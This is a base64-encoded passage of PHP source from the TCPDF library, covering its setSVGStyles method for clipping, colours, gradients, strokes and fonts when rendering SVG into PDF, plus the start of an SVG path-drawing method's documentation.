cnMgZm9yIGNsaXBwaW5nIGZ1bmN0aW9uCgkgKiBAcmV0dXJuIHN0cmluZyBzdHlsZQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA1LjAuMDAwICgyMDEwLTA1LTAyKQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0U1ZHU3R5bGVzKCRzdmdzdHlsZSwgJHByZXZzdmdzdHlsZSwgJHg9MCwgJHk9MCwgJHc9MSwgJGg9MSwgJGNsaXBfZnVuY3Rpb249JycsICRjbGlwX3BhcmFtcz1hcnJheSgpKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCSByZXR1cm47CgkJfQoJCSRvYmpzdHlsZSA9ICcnOwoJCSRtaW5sZW4gPSAoMC4wMSAvICR0aGlzLT5rKTsgLy8gbWluaW11bSBhY2NlcHRhYmxlIGxlbmd0aAoJCWlmICghaXNzZXQoJHN2Z3N0eWxlWydvcGFjaXR5J10pKSB7CgkJCXJldHVybiAkb2Jqc3R5bGU7CgkJfQoJCS8vIGNsaXAtcGF0aAoJCSRyZWdzID0gYXJyYXkoKTsKCQlpZiAocHJlZ19tYXRjaCgnL3VybFwoW1xzXSpcIyhbXlwpXSopXCkvc2knLCAkc3Znc3R5bGVbJ2NsaXAtcGF0aCddLCAkcmVncykpIHsKCQkJJGNsaXBfcGF0aCA9ICR0aGlzLT5zdmdjbGlwcGF0aHNbJHJlZ3NbMV1dOwoJCQlmb3JlYWNoICgkY2xpcF9wYXRoIGFzICRjcCkgewoJCQkJJHRoaXMtPnN0YXJ0U1ZHRWxlbWVudEhhbmRsZXIoJ2NsaXAtcGF0aCcsICRjcFsnbmFtZSddLCAkY3BbJ2F0dHJpYnMnXSwgJGNwWyd0bSddKTsKCQkJfQoJCX0KCQkvLyBvcGFjaXR5CgkJaWYgKCRzdmdzdHlsZVsnb3BhY2l0eSddICE9IDEpIHsKCQkJJHRoaXMtPnNldEFscGhhKCRzdmdzdHlsZVsnb3BhY2l0eSddLCAnTm9ybWFsJywgJHN2Z3N0eWxlWydvcGFjaXR5J10sIGZhbHNlKTsKCQl9CgkJLy8gY29sb3IKCQkkZmlsbF9jb2xvciA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRzdmdzdHlsZVsnY29sb3InXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGZpbGxfY29sb3IpOwoJCS8vIHRleHQgY29sb3IKCQkkdGV4dF9jb2xvciA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRzdmdzdHlsZVsndGV4dC1jb2xvciddLCAkdGhpcy0+c3BvdF9jb2xvcnMpOwoJCSR0aGlzLT5zZXRUZXh0Q29sb3JBcnJheSgkdGV4dF9jb2xvcik7CgkJLy8gY2xpcAoJCWlmIChwcmVnX21hdGNoKCcvcmVjdFwoKFthLXowLTlcLVwuXSorKVtcc10qKyhbYS16MC05XC1cLl0qKylbXHNdKisoW2EtejAtOVwtXC5dKispW1xzXSorKFthLXowLTlcLVwuXSorKVwpL3NpJywgJHN2Z3N0eWxlWydjbGlwJ10sICRyZWdzKSkgewoJCQkkdG9wID0gKGlzc2V0KCRyZWdzWzFdKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRyZWdzWzFdLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkkcmlnaHQgPSAoaXNzZXQoJHJlZ3NbMl0pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHJlZ3NbMl0sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCSRib3R0b20gPSAoaXNzZXQoJHJlZ3NbM10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHJlZ3NbM10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCSRsZWZ0ID0gKGlzc2V0KCRyZWdzWzRdKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRyZWdzWzRdLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkkY3ggPSAkeCArICRsZWZ0OwoJCQkkY3kgPSAkeSArICR0b3A7CgkJCSRjdyA9ICR3IC0gJGxlZnQgLSAkcmlnaHQ7CgkJCSRjaCA9ICRoIC0gJHRvcCAtICRib3R0b207CgkJCWlmICgkc3Znc3R5bGVbJ2NsaXAtcnVsZSddID09ICdldmVub2RkJykgewoJCQkJJGNsaXBfcnVsZSA9ICdDTlonOwoJCQl9IGVsc2UgewoJCQkJJGNsaXBfcnVsZSA9ICdDRU8nOwoJCQl9CgkJCSR0aGlzLT5SZWN0KCRjeCwgJGN5LCAkY3csICRjaCwgJGNsaXBfcnVsZSwgYXJyYXkoKSwgYXJyYXkoKSk7CgkJfQoJCS8vIGZpbGwKCQkkcmVncyA9IGFycmF5KCk7CgkJaWYgKHByZWdfbWF0Y2goJy91cmxcKFtcc10qXCMoW15cKV0qKVwpL3NpJywgJHN2Z3N0eWxlWydmaWxsJ10sICRyZWdzKSkgewoJCQkvLyBncmFkaWVudAoJCQkkZ3JhZGllbnQgPSAkdGhpcy0+c3ZnZ3JhZGllbnRzWyRyZWdzWzFdXTsKCQkJaWYgKGlzc2V0KCRncmFkaWVudFsneHJlZiddKSkgewoJCQkJLy8gcmVmZXJlbmNlIHRvIGFub3RoZXIgZ3JhZGllbnQgZGVmaW5pdGlvbgoJCQkJJG5ld2dyYWRpZW50ID0gJHRoaXMtPnN2Z2dyYWRpZW50c1skZ3JhZGllbnRbJ3hyZWYnXV07CgkJCQkkbmV3Z3JhZGllbnRbJ2Nvb3JkcyddID0gJGdyYWRpZW50Wydjb29yZHMnXTsKCQkJCSRuZXdncmFkaWVudFsnbW9kZSddID0gJGdyYWRpZW50Wydtb2RlJ107CgkJCQkkbmV3Z3JhZGllbnRbJ3R5cGUnXSA9ICRncmFkaWVudFsndHlwZSddOwoJCQkJJG5ld2dyYWRpZW50WydncmFkaWVudFVuaXRzJ10gPSAkZ3JhZGllbnRbJ2dyYWRpZW50VW5pdHMnXTsKCQkJCWlmIChpc3NldCgkZ3JhZGllbnRbJ2dyYWRpZW50VHJhbnNmb3JtJ10pKSB7CgkJCQkJJG5ld2dyYWRpZW50WydncmFkaWVudFRyYW5zZm9ybSddID0gJGdyYWRpZW50WydncmFkaWVudFRyYW5zZm9ybSddOwoJCQkJfQoJCQkJJGdyYWRpZW50ID0gJG5ld2dyYWRpZW50OwoJCQl9CgkJCS8vc2F2ZSBjdXJyZW50IEdyYXBoaWMgU3RhdGUKCQkJJHRoaXMtPl9vdXRTYXZlR3JhcGhpY3NTdGF0ZSgpOwoJCQkvL3NldCBjbGlwcGluZyBhcmVhCgkJCWlmICghZW1wdHkoJGNsaXBfZnVuY3Rpb24pIEFORCBtZXRob2RfZXhpc3RzKCR0aGlzLCAkY2xpcF9mdW5jdGlvbikpIHsKCQkJCSRiYm94ID0gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJHRoaXMsICRjbGlwX2Z1bmN0aW9uKSwgJGNsaXBfcGFyYW1zKTsKCQkJCWlmICgoIWlzc2V0KCRncmFkaWVudFsndHlwZSddKSBPUiAoJGdyYWRpZW50Wyd0eXBlJ10gIT0gMykpIEFORCBpc19hcnJheSgkYmJveCkgQU5EIChjb3VudCgkYmJveCkgPT0gNCkpIHsKCQkJCQlsaXN0KCR4LCAkeSwgJHcsICRoKSA9ICRiYm94OwoJCQkJfQoJCQl9CgkJCWlmICgkZ3JhZGllbnRbJ21vZGUnXSA9PSAnbWVhc3VyZScpIHsKCQkJCWlmICghaXNzZXQoJGdyYWRpZW50Wydjb29yZHMnXVs0XSkpIHsKCQkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzRdID0gMC41OwoJCQkJfQoJCQkJaWYgKGlzc2V0KCRncmFkaWVudFsnZ3JhZGllbnRUcmFuc2Zvcm0nXSkgQU5EICFlbXB0eSgkZ3JhZGllbnRbJ2dyYWRpZW50VHJhbnNmb3JtJ10pKSB7CgkJCQkJJGd0bSA9ICRncmFkaWVudFsnZ3JhZGllbnRUcmFuc2Zvcm0nXTsKCQkJCQkvLyBhcHBseSB0cmFuc2Zvcm1hdGlvbiBtYXRyaXgKCQkJCQkkeGEgPSAoJGd0bVswXSAqICRncmFkaWVudFsnY29vcmRzJ11bMF0pICsgKCRndG1bMl0gKiAkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdKSArICRndG1bNF07CgkJCQkJJHlhID0gKCRndG1bMV0gKiAkZ3JhZGllbnRbJ2Nvb3JkcyddWzBdKSArICgkZ3RtWzNdICogJGdyYWRpZW50Wydjb29yZHMnXVsxXSkgKyAkZ3RtWzVdOwoJCQkJCSR4YiA9ICgkZ3RtWzBdICogJGdyYWRpZW50Wydjb29yZHMnXVsyXSkgKyAoJGd0bVsyXSAqICRncmFkaWVudFsnY29vcmRzJ11bM10pICsgJGd0bVs0XTsKCQkJCQkkeWIgPSAoJGd0bVsxXSAqICRncmFkaWVudFsnY29vcmRzJ11bMl0pICsgKCRndG1bM10gKiAkZ3JhZGllbnRbJ2Nvb3JkcyddWzNdKSArICRndG1bNV07CgkJCQkJJHIgPSBzcXJ0KHBvdygoJGd0bVswXSAqICRncmFkaWVudFsnY29vcmRzJ11bNF0pLCAyKSArIHBvdygoJGd0bVsxXSAqICRncmFkaWVudFsnY29vcmRzJ11bNF0pLCAyKSk7CgkJCQkJJGdyYWRpZW50Wydjb29yZHMnXVswXSA9ICR4YTsKCQkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdID0gJHlhOwoJCQkJCSRncmFkaWVudFsnY29vcmRzJ11bMl0gPSAkeGI7CgkJCQkJJGdyYWRpZW50Wydjb29yZHMnXVszXSA9ICR5YjsKCQkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzRdID0gJHI7CgkJCQl9CgkJCQkvLyBjb252ZXJ0IFNWRyBjb29yZGluYXRlcyB0byB1c2VyIHVuaXRzCgkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzBdID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkZ3JhZGllbnRbJ2Nvb3JkcyddWzBdLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOwoJCQkJJGdyYWRpZW50Wydjb29yZHMnXVsxXSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGdyYWRpZW50Wydjb29yZHMnXVsxXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCSRncmFkaWVudFsnY29vcmRzJ11bMl0gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRncmFkaWVudFsnY29vcmRzJ11bMl0sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk7CgkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzNdID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkZ3JhZGllbnRbJ2Nvb3JkcyddWzNdLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOwoJCQkJJGdyYWRpZW50Wydjb29yZHMnXVs0XSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGdyYWRpZW50Wydjb29yZHMnXVs0XSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCWlmICgkdyA8PSAkbWlubGVuKSB7CgkJCQkJJHcgPSAkbWlubGVuOwoJCQkJfQoJCQkJaWYgKCRoIDw9ICRtaW5sZW4pIHsKCQkJCQkkaCA9ICRtaW5sZW47CgkJCQl9CgkJCQkvLyBzaGlmdCB1bml0cwoJCQkJaWYgKCRncmFkaWVudFsnZ3JhZGllbnRVbml0cyddID09ICdvYmplY3RCb3VuZGluZ0JveCcpIHsKCQkJCQkvLyBjb252ZXJ0IHRvIFNWRyBjb29yZGluYXRlIHN5c3RlbQoJCQkJCSRncmFkaWVudFsnY29vcmRzJ11bMF0gKz0gJHg7CgkJCQkJJGdyYWRpZW50Wydjb29yZHMnXVsxXSArPSAkeTsKCQkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzJdICs9ICR4OwoJCQkJCSRncmFkaWVudFsnY29vcmRzJ11bM10gKz0gJHk7CgkJCQl9CgkJCQkvLyBjYWxjdWxhdGUgcGVyY2VudGFnZXMKCQkJCSRncmFkaWVudFsnY29vcmRzJ11bMF0gPSAoKCRncmFkaWVudFsnY29vcmRzJ11bMF0gLSAkeCkgLyAkdyk7CgkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdID0gKCgkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdIC0gJHkpIC8gJGgpOwoJCQkJJGdyYWRpZW50Wydjb29yZHMnXVsyXSA9ICgoJGdyYWRpZW50Wydjb29yZHMnXVsyXSAtICR4KSAvICR3KTsKCQkJCSRncmFkaWVudFsnY29vcmRzJ11bM10gPSAoKCRncmFkaWVudFsnY29vcmRzJ11bM10gLSAkeSkgLyAkaCk7CgkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzRdIC89ICR3OwoJCQl9IGVsc2VpZiAoJGdyYWRpZW50Wydtb2RlJ10gPT0gJ3BlcmNlbnRhZ2UnKSB7CgkJCQlmb3JlYWNoKCRncmFkaWVudFsnY29vcmRzJ10gYXMgJGtleSA9PiAkdmFsKSB7CgkJCQkJJGdyYWRpZW50Wydjb29yZHMnXVska2V5XSA9IChpbnR2YWwoJHZhbCkgLyAxMDApOwoJCQkJCWlmICgkdmFsIDwgMCkgewoJCQkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWyRrZXldID0gMDsKCQkJCQl9IGVsc2VpZiAoJHZhbCA+IDEpIHsKCQkJCQkJJGdyYWRpZW50Wydjb29yZHMnXVska2V5XSA9IDE7CgkJCQkJfQoJCQkJfQoJCQl9CgkJCWlmICgoJGdyYWRpZW50Wyd0eXBlJ10gPT0gMikgQU5EICgkZ3JhZGllbnRbJ2Nvb3JkcyddWzBdID09ICRncmFkaWVudFsnY29vcmRzJ11bMl0pIEFORCAoJGdyYWRpZW50Wydjb29yZHMnXVsxXSA9PSAkZ3JhZGllbnRbJ2Nvb3JkcyddWzNdKSkgewoJCQkJLy8gc2luZ2xlIGNvbG9yIChubyBzaGFkaW5nKQoJCQkJJGdyYWRpZW50Wydjb29yZHMnXVswXSA9IDE7CgkJCQkkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdID0gMDsKCQkJCSRncmFkaWVudFsnY29vcmRzJ11bMl0gPSAwLjk5OTsKCQkJCSRncmFkaWVudFsnY29vcmRzJ11bM10gPSAwOwoJCQl9CgkJCS8vIHN3YXAgWSBjb29yZGluYXRlcwoJCQkkdG1wID0gJGdyYWRpZW50Wydjb29yZHMnXVsxXTsKCQkJJGdyYWRpZW50Wydjb29yZHMnXVsxXSA9ICRncmFkaWVudFsnY29vcmRzJ11bM107CgkJCSRncmFkaWVudFsnY29vcmRzJ11bM10gPSAkdG1wOwoJCQkvLyBzZXQgdHJhbnNmb3JtYXRpb24gbWFwIGZvciBncmFkaWVudAoJCQkkY3kgPSAoJHRoaXMtPmggLSAkeSk7CgkJCWlmICgkZ3JhZGllbnRbJ3R5cGUnXSA9PSAzKSB7CgkJCQkvLyBjaXJjdWxhciBncmFkaWVudAoJCQkJJGN5IC09ICgkZ3JhZGllbnRbJ2Nvb3JkcyddWzFdICogKCR3ICsgJGgpKTsKCQkJCSRoID0gJHcgPSBtYXgoJHcsICRoKTsKCQkJfSBlbHNlIHsKCQkJCSRjeSAtPSAkaDsKCQkJfQoJCQkkdGhpcy0+X291dChzcHJpbnRmKCclRiAwIDAgJUYgJUYgJUYgY20nLCAoJHcgKiAkdGhpcy0+ayksICgkaCAqICR0aGlzLT5rKSwgKCR4ICogJHRoaXMtPmspLCAoJGN5ICogJHRoaXMtPmspKSk7CgkJCWlmICgoaXNfYXJyYXkoJGdyYWRpZW50WydzdG9wcyddKSB8fCAkZ3JhZGllbnRbJ3N0b3BzJ10gaW5zdGFuY2VvZiBDb3VudGFibGUpICYmIGNvdW50KCRncmFkaWVudFsnc3RvcHMnXSkgPiAxKSB7CgkJCQkkdGhpcy0+R3JhZGllbnQoJGdyYWRpZW50Wyd0eXBlJ10sICRncmFkaWVudFsnY29vcmRzJ10sICRncmFkaWVudFsnc3RvcHMnXSk7CgkJCX0KCQl9IGVsc2VpZiAoJHN2Z3N0eWxlWydmaWxsJ10gIT0gJ25vbmUnKSB7CgkJCSRmaWxsX2NvbG9yID0gVENQREZfQ09MT1JTOjpjb252ZXJ0SFRNTENvbG9yVG9EZWMoJHN2Z3N0eWxlWydmaWxsJ10sICR0aGlzLT5zcG90X2NvbG9ycyk7CgkJCWlmICgkc3Znc3R5bGVbJ2ZpbGwtb3BhY2l0eSddICE9IDEpIHsKCQkJCSR0aGlzLT5zZXRBbHBoYSgkdGhpcy0+YWxwaGFbJ0NBJ10sICdOb3JtYWwnLCAkc3Znc3R5bGVbJ2ZpbGwtb3BhY2l0eSddLCBmYWxzZSk7CgkJCX0KCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRmaWxsX2NvbG9yKTsKCQkJaWYgKCRzdmdzdHlsZVsnZmlsbC1ydWxlJ10gPT0gJ2V2ZW5vZGQnKSB7CgkJCQkkb2Jqc3R5bGUgLj0gJ0YqJzsKCQkJfSBlbHNlIHsKCQkJCSRvYmpzdHlsZSAuPSAnRic7CgkJCX0KCQl9CgkJLy8gc3Ryb2tlCgkJaWYgKCRzdmdzdHlsZVsnc3Ryb2tlJ10gIT0gJ25vbmUnKSB7CgkJCWlmICgkc3Znc3R5bGVbJ3N0cm9rZS1vcGFjaXR5J10gIT0gMSkgewoJCQkJJHRoaXMtPnNldEFscGhhKCRzdmdzdHlsZVsnc3Ryb2tlLW9wYWNpdHknXSwgJ05vcm1hbCcsICR0aGlzLT5hbHBoYVsnY2EnXSwgZmFsc2UpOwoJCQl9IGVsc2VpZiAocHJlZ19tYXRjaCgnL3JnYmFcKFxkKyU/LFxzKlxkKyU/LFxzKlxkKyU/LFxzKihcZCsoPzpcLlxkKyk/KVwpL2knLCAkc3Znc3R5bGVbJ3N0cm9rZSddLCAkcmdiYV9tYXRjaGVzKSkgewoJCQkJJHRoaXMtPnNldEFscGhhKCRyZ2JhX21hdGNoZXNbMV0sICdOb3JtYWwnLCAkdGhpcy0+YWxwaGFbJ2NhJ10sIGZhbHNlKTsKCQkJfQoJCQkkc3Ryb2tlX3N0eWxlID0gYXJyYXkoCgkJCQknY29sb3InID0+IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRzdmdzdHlsZVsnc3Ryb2tlJ10sICR0aGlzLT5zcG90X2NvbG9ycyksCgkJCQknd2lkdGgnID0+ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHN2Z3N0eWxlWydzdHJva2Utd2lkdGgnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSwKCQkJCSdjYXAnID0+ICRzdmdzdHlsZVsnc3Ryb2tlLWxpbmVjYXAnXSwKCQkJCSdqb2luJyA9PiAkc3Znc3R5bGVbJ3N0cm9rZS1saW5lam9pbiddCgkJCQkpOwoJCQlpZiAoaXNzZXQoJHN2Z3N0eWxlWydzdHJva2UtZGFzaGFycmF5J10pIEFORCAhZW1wdHkoJHN2Z3N0eWxlWydzdHJva2UtZGFzaGFycmF5J10pIEFORCAoJHN2Z3N0eWxlWydzdHJva2UtZGFzaGFycmF5J10gIT0gJ25vbmUnKSkgewoJCQkJJHN0cm9rZV9zdHlsZVsnZGFzaCddID0gJHN2Z3N0eWxlWydzdHJva2UtZGFzaGFycmF5J107CgkJCX0KCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkc3Ryb2tlX3N0eWxlKTsKCQkJJG9ianN0eWxlIC49ICdEJzsKCQl9CgkJLy8gZm9udAoJCSRyZWdzID0gYXJyYXkoKTsKCQlpZiAoIWVtcHR5KCRzdmdzdHlsZVsnZm9udCddKSkgewoJCQlpZiAocHJlZ19tYXRjaCgnL2ZvbnQtZmFtaWx5W1xzXSo6W1xzXSooW15cO1wiXSopL3NpJywgJHN2Z3N0eWxlWydmb250J10sICRyZWdzKSkgewoJCQkJJGZvbnRfZmFtaWx5ID0gJHRoaXMtPmdldEZvbnRGYW1pbHlOYW1lKCRyZWdzWzFdKTsKCQkJfSBlbHNlIHsKCQkJCSRmb250X2ZhbWlseSA9ICR0aGlzLT5nZXRGb250RmFtaWx5TmFtZSgkc3Znc3R5bGVbJ2ZvbnQtZmFtaWx5J10pOwoJCQl9CgkJCWlmIChwcmVnX21hdGNoKCcvZm9udC1zaXplW1xzXSo6W1xzXSooW15cc1w7XCJdKikvc2knLCAkc3Znc3R5bGVbJ2ZvbnQnXSwgJHJlZ3MpKSB7CgkJCQkkZm9udF9zaXplID0gdHJpbSgkcmVnc1sxXSk7CgkJCX0gZWxzZSB7CgkJCQkkZm9udF9zaXplID0gJHN2Z3N0eWxlWydmb250LXNpemUnXTsKCQkJfQoJCQlpZiAocHJlZ19tYXRjaCgnL2ZvbnQtc3R5bGVbXHNdKjpbXHNdKihbXlxzXDtcIl0qKS9zaScsICRzdmdzdHlsZVsnZm9udCddLCAkcmVncykpIHsKCQkJCSRmb250X3N0eWxlID0gdHJpbSgkcmVnc1sxXSk7CgkJCX0gZWxzZSB7CgkJCQkkZm9udF9zdHlsZSA9ICRzdmdzdHlsZVsnZm9udC1zdHlsZSddOwoJCQl9CgkJCWlmIChwcmVnX21hdGNoKCcvZm9udC13ZWlnaHRbXHNdKjpbXHNdKihbXlxzXDtcIl0qKS9zaScsICRzdmdzdHlsZVsnZm9udCddLCAkcmVncykpIHsKCQkJCSRmb250X3dlaWdodCA9IHRyaW0oJHJlZ3NbMV0pOwoJCQl9IGVsc2UgewoJCQkJJGZvbnRfd2VpZ2h0ID0gJHN2Z3N0eWxlWydmb250LXdlaWdodCddOwoJCQl9CgkJCWlmIChwcmVnX21hdGNoKCcvZm9udC1zdHJldGNoW1xzXSo6W1xzXSooW15cc1w7XCJdKikvc2knLCAkc3Znc3R5bGVbJ2ZvbnQnXSwgJHJlZ3MpKSB7CgkJCQkkZm9udF9zdHJldGNoID0gdHJpbSgkcmVnc1sxXSk7CgkJCX0gZWxzZSB7CgkJCQkkZm9udF9zdHJldGNoID0gJHN2Z3N0eWxlWydmb250LXN0cmV0Y2gnXTsKCQkJfQoJCQlpZiAocHJlZ19tYXRjaCgnL2xldHRlci1zcGFjaW5nW1xzXSo6W1xzXSooW15cc1w7XCJdKikvc2knLCAkc3Znc3R5bGVbJ2ZvbnQnXSwgJHJlZ3MpKSB7CgkJCQkkZm9udF9zcGFjaW5nID0gdHJpbSgkcmVnc1sxXSk7CgkJCX0gZWxzZSB7CgkJCQkkZm9udF9zcGFjaW5nID0gJHN2Z3N0eWxlWydsZXR0ZXItc3BhY2luZyddOwoJCQl9CgkJfSBlbHNlIHsKCQkJJGZvbnRfZmFtaWx5ID0gJHRoaXMtPmdldEZvbnRGYW1pbHlOYW1lKCRzdmdzdHlsZVsnZm9udC1mYW1pbHknXSk7CgkJCSRmb250X3NpemUgPSAkc3Znc3R5bGVbJ2ZvbnQtc2l6ZSddOwoJCQkkZm9udF9zdHlsZSA9ICRzdmdzdHlsZVsnZm9udC1zdHlsZSddOwoJCQkkZm9udF93ZWlnaHQgPSAkc3Znc3R5bGVbJ2ZvbnQtd2VpZ2h0J107CgkJCSRmb250X3N0cmV0Y2ggPSAkc3Znc3R5bGVbJ2ZvbnQtc3RyZXRjaCddOwoJCQkkZm9udF9zcGFjaW5nID0gJHN2Z3N0eWxlWydsZXR0ZXItc3BhY2luZyddOwoJCX0KCQkkZm9udF9zaXplID0gJHRoaXMtPmdldEhUTUxGb250VW5pdHMoJGZvbnRfc2l6ZSwgJHRoaXMtPnN2Z3N0eWxlc1swXVsnZm9udC1zaXplJ10sICRwcmV2c3Znc3R5bGVbJ2ZvbnQtc2l6ZSddLCAkdGhpcy0+c3ZndW5pdCk7CgkJJGZvbnRfc3RyZXRjaCA9ICR0aGlzLT5nZXRDU1NGb250U3RyZXRjaGluZygkZm9udF9zdHJldGNoLCAkc3Znc3R5bGVbJ2ZvbnQtc3RyZXRjaCddKTsKCQkkZm9udF9zcGFjaW5nID0gJHRoaXMtPmdldENTU0ZvbnRTcGFjaW5nKCRmb250X3NwYWNpbmcsICRzdmdzdHlsZVsnbGV0dGVyLXNwYWNpbmcnXSk7CgkJc3dpdGNoICgkZm9udF9zdHlsZSkgewoJCQljYXNlICdpdGFsaWMnOiB7CgkJCQkkZm9udF9zdHlsZSA9ICdJJzsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ29ibGlxdWUnOiB7CgkJCQkkZm9udF9zdHlsZSA9ICdJJzsKCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6CgkJCWNhc2UgJ25vcm1hbCc6IHsKCQkJCSRmb250X3N0eWxlID0gJyc7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlzd2l0Y2ggKCRmb250X3dlaWdodCkgewoJCQljYXNlICdib2xkJzoKCQkJY2FzZSAnYm9sZGVyJzogewoJCQkJJGZvbnRfc3R5bGUgLj0gJ0InOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbm9ybWFsJzogewoJCQkJaWYgKChzdWJzdHIoJGZvbnRfZmFtaWx5LCAtMSkgPT0gJ0knKSBBTkQgKHN1YnN0cigkZm9udF9mYW1pbHksIC0yLCAxKSA9PSAnQicpKSB7CgkJCQkJJGZvbnRfZmFtaWx5ID0gc3Vic3RyKCRmb250X2ZhbWlseSwgMCwgLTIpLidJJzsKCQkJCX0gZWxzZWlmIChzdWJzdHIoJGZvbnRfZmFtaWx5LCAtMSkgPT0gJ0InKSB7CgkJCQkJJGZvbnRfZmFtaWx5ID0gc3Vic3RyKCRmb250X2ZhbWlseSwgMCwgLTEpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQl9CgkJc3dpdGNoICgkc3Znc3R5bGVbJ3RleHQtZGVjb3JhdGlvbiddKSB7CgkJCWNhc2UgJ3VuZGVybGluZSc6IHsKCQkJCSRmb250X3N0eWxlIC49ICdVJzsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ292ZXJsaW5lJzogewoJCQkJJGZvbnRfc3R5bGUgLj0gJ08nOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbGluZS10aHJvdWdoJzogewoJCQkJJGZvbnRfc3R5bGUgLj0gJ0QnOwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDoKCQkJY2FzZSAnbm9uZSc6IHsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5zZXRGb250KCRmb250X2ZhbWlseSwgJGZvbnRfc3R5bGUsICRmb250X3NpemUpOwoJCSR0aGlzLT5zZXRGb250U3RyZXRjaGluZygkZm9udF9zdHJldGNoKTsKCQkkdGhpcy0+c2V0Rm9udFNwYWNpbmcoJGZvbnRfc3BhY2luZyk7CgkJcmV0dXJuICRvYmpzdHlsZTsKCX0KCgkvKioKCSAqIERyYXdzIGFuIFNWRyBwYXRoCgkgKiBAcGFyYW0gc3RyaW5nICRkIGF0dHJpYnV0ZSBkIG9mIHRoZSBwYXRoIFNWRyBlbGVtZW50CgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFBvc3NpYmxlIHZhbHVlcyBhcmU6CgkgKiA8dWw+CgkgKgkgPGxpPkQgb3IgZW1wdHkgc3RyaW5nOiBEcmF3IChkZWZhdWx0KS48L2xpPgoJICoJIDxsaT5GOiBGaWxsLjwvbGk+CgkgKgkgPGxpPkYqOiBGaWxsIHVzaW5nIHRoZSBldmVuLW9kZCBydWxlIHRvIGRldGVybWluZSB3aGljaCByZWdpb25zIGxpZSBpbnNpZGUgdGhlIGNsaXBwaW5nIHBhdGguPC9saT4KCSAqCSA8bGk+REYgb3IgRkQ6IERyYXcgYW5kIGZpbGwuPC9saT4KCSAqCSA8bGk+REYqIG9yIEZEKjogRHJhdyBhbmQgZmlsbCB1c2luZyB0aGUgZXZlbi1vZGQgcnVsZSB0byBkZXRlcm1pbmUgd2hpY2ggcmVnaW9ucyBsaWUgaW5zaWRlIHRoZSBjbGlwcGluZyBwYXRoLjwvbGk+CgkgKgkgPGxpPkNOWjogQ2xpcHBpbmcgbW9kZSAodXNpbmcgdGhlIGV2ZW4tb2RkIHJ1bGUgdG8gZGV0ZXJtaW5lIHdoaWNoIHJlZ2lvbnMgbGllIGluc2lkZSB0aGUgY2xpcHBpbmcgcGF0aCkuPC9saT4KCSAqCSA8bGk+Q0VPOiBDbGlwcGluZyBtb2RlICh1c2luZyB0aGUgbm9uemVybyB3aW5kaW5nIG51bWJlciBydWxlIHRvIGRldGVybWluZSB3aGljaCByZWdpb25zIGxpZSBpbnNpZGUgdGhlIGNsaXBwaW5nIHBhdGgpLjwvbGk+CgkgKiA8L3VsPgoJICogQHJldHVybiBhcnJheSBvZiBjb250YWluZXIgYm94IG1lYXN1cmVzICh4LCB5LCB3LCBoKQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA1LjAuMDAwICgyMDEwLTA1LTAyKQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gU